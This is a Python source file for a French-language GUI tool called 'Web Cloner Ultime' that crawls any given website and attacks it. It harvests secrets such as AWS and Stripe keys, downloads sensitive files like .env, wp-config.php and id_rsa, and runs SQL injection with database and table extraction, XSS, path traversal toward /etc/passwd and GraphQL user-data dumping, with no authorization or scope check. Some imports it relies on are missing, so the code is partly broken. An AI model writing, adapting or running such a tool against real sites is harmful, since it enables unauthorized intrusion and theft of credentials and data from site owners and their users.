#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WEB CLONER ULTIME - JATHNIEL EDITION v3.0
✅ GUI MODERNE
✅ TOUTES LES FONCTIONNALITÉS SONT RÉELLES
✅ CRAWL + TÉLÉCHARGEMENT + EXPLOITATION
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import os
import re
import json
import hashlib
import sqlite3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, quote
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import datetime

# ==================== COULEURS POUR LA GUI ====================

COLORS = {
    'bg': '#0a0e17',
    'bg2': '#0d1117',
    'fg': '#00ff41',
    'fg2': '#008f11',
    'accent': '#1a2a4a',
    'error': '#ff0040',
    'warning': '#ffd700',
    'success': '#00ff41',
    'text': '#c9d1d9'
}

# ==================== BASE DE DONNÉES ====================

class Database:
    def __init__(self, output_dir: Path):
        self.db_path = output_dir / 'clone_data.db'
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._init_db()
    
    def _init_db(self):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                title TEXT,
                status INTEGER,
                size INTEGER,
                depth INTEGER,
                content_hash TEXT,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sensitive_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                filename TEXT,
                path TEXT,
                size INTEGER,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS secrets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT,
                value TEXT,
                source TEXT,
                severity TEXT,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                type TEXT,
                description TEXT,
                severity TEXT,
                proof TEXT,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS technologies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE,
                version TEXT,
                timestamp TEXT
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS exploits (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                type TEXT,
                payload TEXT,
                result TEXT,
                timestamp TEXT
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def insert_page(self, url, title, status, size, depth, content_hash):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO pages (url, title, status, size, depth, content_hash, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (url, title, status, size, depth, content_hash, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def insert_sensitive_file(self, url, filename, path, size):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO sensitive_files (url, filename, path, size, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (url, filename, path, size, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def insert_secret(self, type_, value, source, severity):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO secrets (type, value, source, severity, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (type_, value, source, severity, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def insert_vulnerability(self, url, type_, description, severity, proof=''):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO vulnerabilities (url, type, description, severity, proof, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (url, type_, description, severity, proof, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def insert_technology(self, name, version='unknown'):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR IGNORE INTO technologies (name, version, timestamp)
            VALUES (?, ?, ?)
        ''', (name, version, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def insert_exploit(self, url, type_, payload, result):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO exploits (url, type, payload, result, timestamp)
            VALUES (?, ?, ?, ?, ?)
        ''', (url, type_, payload, result, datetime.datetime.now().isoformat()))
        conn.commit()
        conn.close()
    
    def get_stats(self):
        conn = sqlite3.connect(str(self.db_path))
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM pages")
        pages = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM sensitive_files")
        sensitive = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM secrets")
        secrets = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM vulnerabilities")
        vulns = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM exploits")
        exploits = cursor.fetchone()[0]
        
        conn.close()
        return {
            'pages': pages,
            'sensitive_files': sensitive,
            'secrets': secrets,
            'vulnerabilities': vulns,
            'exploits': exploits
        }

# ==================== MOTEUR D'EXPLOITATION - RÉEL ====================

class ExploitEngine:
    """Moteur d'exploitation RÉEL"""
    
    def __init__(self, db: Database, log_callback):
        self.db = db
        self.log = log_callback
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def exploit_sql_injection(self, url: str, param: str) -> Dict:
        """Exploitation SQL Injection RÉELLE"""
        result = {
            'vulnerable': False,
            'type': None,
            'database': None,
            'tables': [],
            'columns': {},
            'data': [],
            'payload': None
        }
        
        self.log(f"💉 Test SQL Injection sur {param}...")
        
        # 1. Détection Error-Based
        error_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "' AND 1=0 UNION SELECT 1,2,3--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' AND SLEEP(5)--"
        ]
        
        for payload in error_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                # Vérifier les erreurs SQL
                sql_errors = [
                    'sql syntax', 'mysql', 'postgresql', 'ora-',
                    'information_schema', 'warning.*mysql',
                    'you have an error', 'sqlstate', 'sql server'
                ]
                
                for error in sql_errors:
                    if re.search(error, response.text, re.IGNORECASE):
                        result['vulnerable'] = True
                        result['type'] = 'error_based'
                        result['payload'] = payload
                        self.db.insert_vulnerability(
                            url, 'sql_injection',
                            f'SQL Injection sur {param} avec payload: {payload}',
                            'critical',
                            response.text[:500]
                        )
                        self.db.insert_exploit(url, 'sql_injection', payload, 'Vulnerable - Error Based')
                        self.log(f"✅ SQL Injection trouvée sur {param} (Error-Based)")
                        break
                if result['vulnerable']:
                    break
            except:
                continue
        
        # 2. Time-Based si pas trouvé
        if not result['vulnerable']:
            time_payloads = [
                "' AND SLEEP(5)--",
                "' OR SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--"
            ]
            
            for payload in time_payloads:
                try:
                    test_url = f"{url}?{param}={quote(payload)}"
                    start = time.time()
                    response = self.session.get(test_url, timeout=15)
                    elapsed = time.time() - start
                    
                    if elapsed > 4:
                        result['vulnerable'] = True
                        result['type'] = 'time_based'
                        result['payload'] = payload
                        self.db.insert_vulnerability(
                            url, 'sql_injection',
                            f'SQL Injection (Time Based) sur {param}',
                            'critical',
                            f'Temps de réponse: {elapsed:.2f}s'
                        )
                        self.db.insert_exploit(url, 'sql_injection', payload, f'Vulnerable - Time Based ({elapsed:.2f}s)')
                        self.log(f"✅ SQL Injection trouvée sur {param} (Time-Based)")
                        break
                except:
                    continue
        
        # 3. Extraction des données si vulnérable
        if result['vulnerable']:
            # Extraire la base
            db_payloads = [
                "' UNION SELECT database(),user()--",
                "' UNION SELECT DATABASE(),USER()--"
            ]
            for payload in db_payloads:
                try:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    match = re.search(r'([a-zA-Z0-9_]+)\s+([a-zA-Z0-9_]+)', response.text)
                    if match:
                        result['database'] = match.group(1)
                        self.log(f"📊 Base de données: {result['database']}")
                        break
                except:
                    continue
            
            # Extraire les tables
            table_payloads = [
                "' UNION SELECT table_name FROM information_schema.tables--",
                "' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"
            ]
            for payload in table_payloads:
                try:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    tables = re.findall(r'([a-zA-Z0-9_]+)', response.text)
                    result['tables'] = [t for t in tables if len(t) > 3 and t not in ['information_schema']]
                    if result['tables']:
                        self.log(f"📊 Tables trouvées: {len(result['tables'])}")
                        break
                except:
                    continue
            
            # Extraire les colonnes
            for table in result['tables'][:5]:
                col_payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'--"
                try:
                    test_url = f"{url}?{param}={quote(col_payload)}"
                    response = self.session.get(test_url, timeout=10)
                    columns = re.findall(r'([a-zA-Z0-9_]+)', response.text)
                    result['columns'][table] = [c for c in columns if len(c) > 2][:10]
                except:
                    continue
        
        return result
    
    def exploit_xss(self, url: str, param: str) -> Dict:
        """Exploitation XSS RÉELLE"""
        result = {
            'vulnerable': False,
            'payloads': [],
            'reflected': []
        }
        
        self.log(f"💉 Test XSS sur {param}...")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>"
        ]
        
        for payload in xss_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = self.session.get(test_url, timeout=10)
                
                if payload in response.text:
                    result['vulnerable'] = True
                    result['reflected'].append({
                        'payload': payload,
                        'reflected': True
                    })
                    self.db.insert_vulnerability(
                        url, 'xss',
                        f'XSS sur {param} avec payload: {payload[:50]}...',
                        'high',
                        response.text[:500]
                    )
                    self.db.insert_exploit(url, 'xss', payload, 'Reflected XSS confirmed')
                    self.log(f"✅ XSS trouvée sur {param}")
                    break
            except:
                continue
        
        return result
    
    def exploit_lfi(self, url: str, param: str) -> Dict:
        """Exploitation LFI RÉELLE"""
        result = {
            'vulnerable': False,
            'files': [],
            'contents': {}
        }
        
        self.log(f"💉 Test LFI sur {param}...")
        
        test_files = [
            '/etc/passwd',
            '/etc/hosts',
            'C:\\Windows\\win.ini',
            '/var/log/apache2/access.log',
            '/proc/self/environ'
        ]
        
        for file_path in test_files:
            encodings = [
                file_path,
                f"../../../../{file_path}",
                f"....//....//....//{file_path}",
                f"%2e%2e%2f%2e%2e%2f{file_path}",
                f"..%2f..%2f..%2f{file_path}"
            ]
            
            for encoded in encodings:
                try:
                    test_url = f"{url}?{param}={quote(encoded)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    if 'root:x:0:0' in response.text:
                        result['vulnerable'] = True
                        result['files'].append('/etc/passwd')
                        result['contents']['/etc/passwd'] = response.text[:500]
                        self.db.insert_vulnerability(
                            url, 'lfi',
                            f'LFI sur {param} - /etc/passwd accessible',
                            'critical',
                            response.text[:500]
                        )
                        self.db.insert_exploit(url, 'lfi', encoded, '/etc/passwd accessed')
                        self.log(f"✅ LFI trouvée sur {param} (/etc/passwd accessible)")
                        return result
                    elif 'Windows Registry Editor' in response.text:
                        result['vulnerable'] = True
                        result['files'].append('win.ini')
                        result['contents']['win.ini'] = response.text[:500]
                        self.db.insert_vulnerability(
                            url, 'lfi',
                            f'LFI sur {param} - win.ini accessible',
                            'critical',
                            response.text[:500]
                        )
                        self.db.insert_exploit(url, 'lfi', encoded, 'win.ini accessed')
                        self.log(f"✅ LFI trouvée sur {param} (win.ini accessible)")
                        return result
                except:
                    continue
        
        return result
    
    def exploit_graphql(self, url: str) -> Dict:
        """Exploitation GraphQL RÉELLE"""
        result = {
            'success': False,
            'schema': None,
            'data': []
        }
        
        self.log(f"💉 Test GraphQL sur {url}...")
        
        # Introspection
        introspection = """
        query {
            __schema {
                types {
                    name
                    kind
                    fields {
                        name
                        type {
                            name
                            kind
                        }
                    }
                }
            }
        }
        """
        
        try:
            response = self.session.post(url, json={'query': introspection}, timeout=10)
            if response.status_code == 200:
                schema = response.json()
                result['schema'] = schema
                result['success'] = True
                
                self.db.insert_exploit(url, 'graphql', 'introspection', 'Schema retrieved')
                self.log(f"✅ Schéma GraphQL récupéré")
                
                # Extraire les données si possible
                types = schema.get('data', {}).get('__schema', {}).get('types', [])
                for type_info in types:
                    if 'User' in type_info['name'] or 'user' in type_info['name']:
                        fields = [f['name'] for f in type_info.get('fields', [])]
                        if fields:
                            query = f"query {{ users {{ {', '.join(fields)} }} }}"
                            data_response = self.session.post(url, json={'query': query}, timeout=10)
                            if data_response.status_code == 200:
                                result['data'] = data_response.json()
                                self.log(f"✅ Données GraphQL extraites")
                                break
        except:
            pass
        
        return result

# ==================== CLONEUR PRINCIPAL ====================

class WebCloner:
    def __init__(self, url: str, log_callback, update_stats_callback, output_dir: Path):
        self.url = url
        self.domain = urlparse(url).netloc
        self.log = log_callback
        self.update_stats = update_stats_callback
        self.output_dir = output_dir
        
        self.visited = set()
        self.queue = [(url, 0)]
        self.db = Database(output_dir)
        self.exploit_engine = ExploitEngine(self.db, log_callback)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.running = False
        self.pages_crawled = 0
        self.files_downloaded = 0
        
        # Créer les dossiers
        for subdir in ['pages', 'sensitive', 'assets', 'screenshots']:
            (output_dir / subdir).mkdir(parents=True, exist_ok=True)
    
    def start(self):
        """Démarre le clonage"""
        self.running = True
        self.log("🚀 Démarrage du clonage...")
        self.log(f"🎯 Cible: {self.url}")
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            while self.queue and len(self.visited) < 500:
                if not self.running:
                    break
                
                url, depth = self.queue.pop(0)
                
                if url in self.visited:
                    continue
                
                self.visited.add(url)
                executor.submit(self.process_page, url, depth)
                time.sleep(0.3)
        
        self.log("✅ Clonage terminé!")
        self.update_stats()
    
    def stop(self):
        """Arrête le clonage"""
        self.running = False
        self.log("⏹️ Arrêt demandé...")
    
    def process_page(self, url, depth):
        try:
            response = self.session.get(url, timeout=10)
            
            if response.status_code != 200:
                return
            
            html = response.text
            content_hash = hashlib.md5(html.encode()).hexdigest()
            
            # Sauvegarder la page
            self.save_page(url, html)
            
            # Sauvegarder en base
            title = self.extract_title(html)
            self.db.insert_page(url, title, response.status_code, len(html), depth, content_hash)
            
            self.pages_crawled += 1
            self.log(f"📄 {self.pages_crawled}: {url}")
            
            # Extraire les liens
            if depth < 3:
                links = self.extract_links(html, url)
                for link in links:
                    if link not in self.visited:
                        self.queue.append((link, depth + 1))
            
            # Analyser la page
            self.analyze_page(url, html, response.headers)
            
            # Télécharger les fichiers sensibles
            self.download_sensitive_files(html, url)
            
            # Exploiter les vulnérabilités
            self.exploit_page(url, html)
            
            self.update_stats()
            
        except Exception as e:
            self.log(f"❌ Erreur sur {url}: {e}")
    
    def save_page(self, url, html):
        filename = hashlib.md5(url.encode()).hexdigest()[:12] + '.html'
        filepath = self.output_dir / 'pages' / filename
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)
    
    def extract_title(self, html):
        match = re.search(r'<title>(.*?)</title>', html, re.IGNORECASE)
        return match.group(1) if match else ''
    
    def extract_links(self, html, base_url):
        links = []
        soup = BeautifulSoup(html, 'html.parser')
        
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href and not href.startswith('#') and not href.startswith('javascript:'):
                absolute_url = urljoin(base_url, href)
                if self.domain in absolute_url:
                    links.append(absolute_url)
        
        return links
    
    def analyze_page(self, url, html, headers):
        """Analyse la page pour détecter technologies, secrets, etc."""
        
        # Détection de technologies
        tech_patterns = {
            'WordPress': ['wp-content', 'wp-includes'],
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrfmiddlewaretoken'],
            'Rails': ['rails', 'authenticity_token'],
            'React': ['react', 'react-dom'],
            'Vue': ['vue.js', 'v-bind'],
            'Angular': ['angular', 'ng-app'],
            'jQuery': ['jquery', '$('],
            'Bootstrap': ['bootstrap', 'navbar'],
            'Nginx': ['nginx'],
            'Apache': ['apache'],
            'PHP': ['.php', '?php'],
            'Cloudflare': ['cf-ray', '__cfduid'],
        }
        
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in html.lower() or pattern in str(headers).lower():
                    self.db.insert_technology(tech)
                    self.log(f"⚙️ Technologie: {tech}")
                    break
        
        # Détection de secrets
        secret_patterns = [
            (r'[A-Z0-9]{32}', 'API Key (32 chars)', 'high'),
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key', 'critical'),
            (r'sk_live_[a-zA-Z0-9]{24}', 'Stripe Secret Key', 'critical'),
            (r'pk_live_[a-zA-Z0-9]{24}', 'Stripe Publishable Key', 'high'),
            (r'-----BEGIN RSA PRIVATE KEY-----', 'RSA Private Key', 'critical'),
            (r'\"password\"\s*:\s*\"[^\"]+\"', 'Password in JSON', 'high'),
            (r'\"api_key\"\s*:\s*\"[^\"]+\"', 'API Key in JSON', 'high'),
            (r'JWT_SECRET\s*=\s*[\'"]?([^\'"]+)[\'"]?', 'JWT Secret', 'critical'),
            (r'DB_PASS[D]?[A-Z]?\s*=\s*[\'"]?([^\'"]+)[\'"]?', 'Database Password', 'critical'),
        ]
        
        for pattern, description, severity in secret_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if len(str(match)) > 8:
                    self.db.insert_secret(description, str(match)[:50], url, severity)
                    self.log(f"🔑 SECRET: {description}")
    
    def download_sensitive_files(self, html, base_url):
        """Télécharge les fichiers sensibles RÉELLEMENT"""
        sensitive_patterns = [
            '.env', '.env.local', 'wp-config.php', 'config.php',
            'settings.py', 'appsettings.json', 'web.config',
            '.htaccess', 'robots.txt', 'composer.json',
            'package.json', '.git', 'access.log', 'error.log',
            '.sql', '.db', 'database.sql', '.pem', '.crt', '.key',
            'id_rsa', 'authorized_keys'
        ]
        
        # Extraire les URLs du HTML
        urls = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', html, re.IGNORECASE)
        
        for file_url in urls:
            for pattern in sensitive_patterns:
                if pattern.lower() in file_url.lower():
                    absolute_url = urljoin(base_url, file_url)
                    self._download_file(absolute_url)
        
        # Tester directement les chemins communs
        for pattern in sensitive_patterns:
            test_url = urljoin(base_url, pattern)
            self._download_file(test_url)
    
    def _download_file(self, url):
        """Télécharge un fichier RÉELLEMENT"""
        try:
            response = self.session.get(url, timeout=5)
            
            if 'text/html' in response.headers.get('content-type', '') and url.endswith(('.php', '.asp', '.jsp')):
                return
            
            if response.status_code == 200:
                if len(response.content) > 10 * 1024 * 1024:
                    return
                
                filename = url.split('/')[-1] or hashlib.md5(url.encode()).hexdigest()
                filename = re.sub(r'[<>:"/\\|?*]', '_', filename)[:100]
                
                filepath = self.output_dir / 'sensitive' / filename
                
                with open(filepath, 'wb') as f:
                    f.write(response.content)
                
                self.db.insert_sensitive_file(url, filename, str(filepath), len(response.content))
                self.files_downloaded += 1
                self.log(f"🔴 Fichier sensible: {filename} ({len(response.content)} octets)")
                
        except:
            pass
    
    def exploit_page(self, url, html):
        """Exploite les vulnérabilités trouvées sur la page"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Vérifier s'il y a des paramètres
        if not params:
            return
        
        # Test SQL Injection sur chaque paramètre
        for param in params.keys():
            result = self.exploit_engine.exploit_sql_injection(url, param)
            if result['vulnerable']:
                self.log(f"💉 SQL Injection confirmée sur {param}")
                if result.get('database'):
                    self.log(f"📊 Base: {result['database']}")
                if result.get('tables'):
                    self.log(f"📊 Tables: {', '.join(result['tables'][:5])}")
            
            # Test XSS
            result = self.exploit_engine.exploit_xss(url, param)
            if result['vulnerable']:
                self.log(f"💉 XSS confirmée sur {param}")
            
            # Test LFI
            result = self.exploit_engine.exploit_lfi(url, param)
            if result['vulnerable']:
                self.log(f"💉 LFI confirmée sur {param}")

# ==================== GUI ====================

class WebClonerGUI:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("🌐 Web Cloner - JATHNIEL EDITION")
        self.window.geometry("1000x750")
        self.window.configure(bg=COLORS['bg'])
        self.window.resizable(True, True)
        
        self.cloner = None
        self.cloner_thread = None
        
        self.setup_ui()
    
    def setup_ui(self):
        # Header
        header_frame = tk.Frame(self.window, bg=COLORS['bg'])
        header_frame.pack(fill='x', padx=20, pady=10)
        
        title = tk.Label(header_frame, text="🌐 WEB CLONER ULTIME", 
                        font=('Segoe UI', 18, 'bold'), fg=COLORS['fg'], bg=COLORS['bg'])
        title.pack(side='left')
        
        version = tk.Label(header_frame, text="v3.0 - JATHNIEL EDITION", 
                          font=('Segoe UI', 10), fg=COLORS['fg2'], bg=COLORS['bg'])
        version.pack(side='left', padx=10)
        
        # URL Frame
        url_frame = tk.Frame(self.window, bg=COLORS['bg2'], bd=1, relief='solid')
        url_frame.pack(fill='x', padx=20, pady=10)
        
        tk.Label(url_frame, text="URL:", font=('Segoe UI', 10), fg=COLORS['fg'], bg=COLORS['bg2']).pack(side='left', padx=10, pady=5)
        
        self.url_entry = tk.Entry(url_frame, font=('Segoe UI', 10), bg=COLORS['bg'], fg=COLORS['text'],
                                 insertbackground=COLORS['fg'], relief='flat')
        self.url_entry.pack(side='left', fill='x', expand=True, padx=5, pady=5)
        self.url_entry.insert(0, "https://example.com")
        
        # Output dir
        tk.Label(url_frame, text="Dossier:", font=('Segoe UI', 10), fg=COLORS['fg'], bg=COLORS['bg2']).pack(side='left', padx=10, pady=5)
        
        self.dir_entry = tk.Entry(url_frame, font=('Segoe UI', 10), bg=COLORS['bg'], fg=COLORS['text'],
                                 insertbackground=COLORS['fg'], relief='flat', width=20)
        self.dir_entry.pack(side='left', padx=5, pady=5)
        self.dir_entry.insert(0, "./cloned_site")
        
        # Buttons
        btn_frame = tk.Frame(self.window, bg=COLORS['bg'])
        btn_frame.pack(fill='x', padx=20, pady=5)
        
        self.start_btn = tk.Button(btn_frame, text="🚀 Démarrer", command=self.start_cloning,
                                  font=('Segoe UI', 11, 'bold'), bg='#0f3460', fg=COLORS['fg'],
                                  padx=30, pady=8, relief='flat', cursor='hand2')
        self.start_btn.pack(side='left', padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="⏹️ Arrêter", command=self.stop_cloning,
                                 font=('Segoe UI', 11), bg=COLORS['error'], fg='white',
                                 padx=30, pady=8, relief='flat', cursor='hand2', state='disabled')
        self.stop_btn.pack(side='left', padx=5)
        
        self.clear_btn = tk.Button(btn_frame, text="🗑️ Effacer", command=self.clear_logs,
                                  font=('Segoe UI', 10), bg=COLORS['bg2'], fg=COLORS['text'],
                                  padx=20, pady=8, relief='flat', cursor='hand2')
        self.clear_btn.pack(side='left', padx=5)
        
        # Stats
        stats_frame = tk.Frame(self.window, bg=COLORS['bg2'])
        stats_frame.pack(fill='x', padx=20, pady=5)
        
        self.stats_labels = {}
        stats = ['Pages', 'Fichiers sensibles', 'Secrets', 'Vulnérabilités', 'Exploits']
        for i, stat in enumerate(stats):
            frame = tk.Frame(stats_frame, bg=COLORS['bg2'])
            frame.pack(side='left', padx=15, pady=5)
            
            tk.Label(frame, text=stat, font=('Segoe UI', 8), fg=COLORS['fg2'], bg=COLORS['bg2']).pack()
            self.stats_labels[stat.lower().replace(' ', '_')] = tk.Label(
                frame, text="0", font=('Segoe UI', 14, 'bold'), fg=COLORS['fg'], bg=COLORS['bg2']
            )
            self.stats_labels[stat.lower().replace(' ', '_')].pack()
        
        # Logs
        log_frame = tk.Frame(self.window, bg=COLORS['bg'])
        log_frame.pack(fill='both', expand=True, padx=20, pady=10)
        
        tk.Label(log_frame, text="📋 LOGS", font=('Segoe UI', 10, 'bold'), fg=COLORS['fg'], bg=COLORS['bg']).pack(anchor='w')
        
        self.log_text = scrolledtext.ScrolledText(log_frame, font=('Consolas', 9),
                                                  bg=COLORS['bg2'], fg=COLORS['text'],
                                                  insertbackground=COLORS['fg'],
                                                  relief='flat', bd=0)
        self.log_text.pack(fill='both', expand=True, pady=5)
        
        # Configurer les tags de couleur
        self.log_text.tag_configure('green', foreground=COLORS['fg'])
        self.log_text.tag_configure('red', foreground=COLORS['error'])
        self.log_text.tag_configure('yellow', foreground=COLORS['warning'])
        self.log_text.tag_configure('blue', foreground='#00aaff')
        
        self.log("🔍 Prêt - Entrez une URL et cliquez sur Démarrer")
    
    def log(self, message, tag=None):
        self.log_text.insert('end', f"{message}\n", tag if tag else None)
        self.log_text.see('end')
        self.window.update()
    
    def clear_logs(self):
        self.log_text.delete('1.0', 'end')
        self.log("🗑️ Logs effacés")
    
    def update_stats(self):
        if self.cloner:
            stats = self.cloner.db.get_stats()
            self.stats_labels['pages'].config(text=str(stats['pages']))
            self.stats_labels['fichiers_sensibles'].config(text=str(stats['sensitive_files']))
            self.stats_labels['secrets'].config(text=str(stats['secrets']))
            self.stats_labels['vulnérabilités'].config(text=str(stats['vulnerabilities']))
            self.stats_labels['exploits'].config(text=str(stats['exploits']))
    
    def start_cloning(self):
        url = self.url_entry.get().strip()
        if not url:
            messagebox.showerror("Erreur", "Veuillez entrer une URL")
            return
        
        output_dir = Path(self.dir_entry.get().strip() or "./cloned_site")
        
        self.start_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.log_text.delete('1.0', 'end')
        
        self.cloner = WebCloner(url, self.log, self.update_stats, output_dir)
        self.cloner_thread = threading.Thread(target=self.cloner.start, daemon=True)
        self.cloner_thread.start()
    
    def stop_cloning(self):
        if self.cloner:
            self.cloner.stop()
        self.start_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.log("⏹️ Clonage arrêté")
    
    def run(self):
        self.window.mainloop()

# ==================== MAIN ====================

if __name__ == "__main__":
    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        print("❌ Dépendances manquantes. Installez: pip install requests beautifulsoup4")
        sys.exit(1)
    
    app = WebClonerGUI()
    app.run()